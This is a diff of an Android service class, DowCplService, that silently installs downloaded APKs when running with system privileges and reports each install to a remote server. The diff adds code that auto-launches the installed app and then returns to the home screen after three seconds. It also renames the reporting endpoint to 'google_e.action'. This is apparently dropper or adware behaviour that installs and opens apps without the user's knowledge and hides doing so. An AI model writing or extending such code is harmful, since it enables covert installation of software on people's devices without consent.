@@ -12,17 +12,18 @@ import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.database.Cursor;
 import android.net.Uri;
+import android.text.TextUtils;
 
 public class DowCplService extends IntentService {
 
+	private SilentService s;
+
 	public DowCplService(String name) {
 		super("DowCplService");
-		// TODO Auto-generated constructor stub
 	}
 
 	public DowCplService() {
 		super("DowCplService");
-		// TODO Auto-generated constructor stub
 	}
 
 	@Override
@@ -40,6 +41,9 @@ public class DowCplService extends IntentService {
 
 		try {
 
+			/**
+			 * COLUMN_LOCAL_URI INDEX
+			 */
 			int col_file_uri = cursor
 					.getColumnIndex(DownloadManager.COLUMN_LOCAL_URI);
 
@@ -47,19 +51,37 @@ public class DowCplService extends IntentService {
 
 				String localuri = cursor.getString(col_file_uri);
 
+				/**
+				 * if the localuri is null or "",return ;finish
+				 */
+				if (TextUtils.isEmpty(localuri)) {
+					return;
+				}
+
 				PackageInfo pi = getPackageManager().getPackageArchiveInfo(
 						Uri.parse(localuri).getPath(), 0);
 
+				/**
+				 * Parse the app.apk is success,execute install
+				 */
 				if (pi != null) {
 
 					int isSystemApp = MyHelpUtil
 							.isSystemApp(getApplicationContext());
 
+					/**
+					 * isSystemApp == 0
+					 */
 					if (isSystemApp == 0) {
 
-						/* Sys */
+						/**
+						 * Synchronous download status to server
+						 */
 						sysDownComple(pi.packageName);
 
+						/**
+						 * check i ==1 is install error,delete the file;
+						 */
 						int i = MyHelpUtil.install(Uri.parse(localuri)
 								.getPath());
 
@@ -77,8 +99,7 @@ public class DowCplService extends IntentService {
 
 						if (i == 0) {
 
-							SilentService s = new SilentService(
-									getApplicationContext());
+							s = new SilentService(getApplicationContext());
 
 							s.sysInstall(pi.packageName);
 
@@ -86,19 +107,28 @@ public class DowCplService extends IntentService {
 
 							if (s.checkOpenTime()) {
 
+								s.synchroOpenData(pi.packageName);
+
 								MyHelpUtil.openApp(pi.packageName,
 										getApplicationContext());
 
-								s.synchroOpenData(pi.packageName);
+								try {
 
-								s.openApp();
+									Thread.sleep(3 * 1000);
+
+									s.backHome();
+
+								} catch (InterruptedException e) {
+									// TODO Auto-generated catch block
+									e.printStackTrace();
+								}
 
 							}
 
 						}
 
 					} else {
-						/* sys_msgDownloadComplete- */
+
 						MyHelpUtil.sys_msg(getApplicationContext(), 15,
 								pi.packageName);
 
@@ -127,7 +157,7 @@ public class DowCplService extends IntentService {
 				getApplicationContext());
 
 		try {
-			HttpUtil.postRequest(HttpUtil.BASE_URL + "app_e.action", params);
+			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_e.action", params);
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
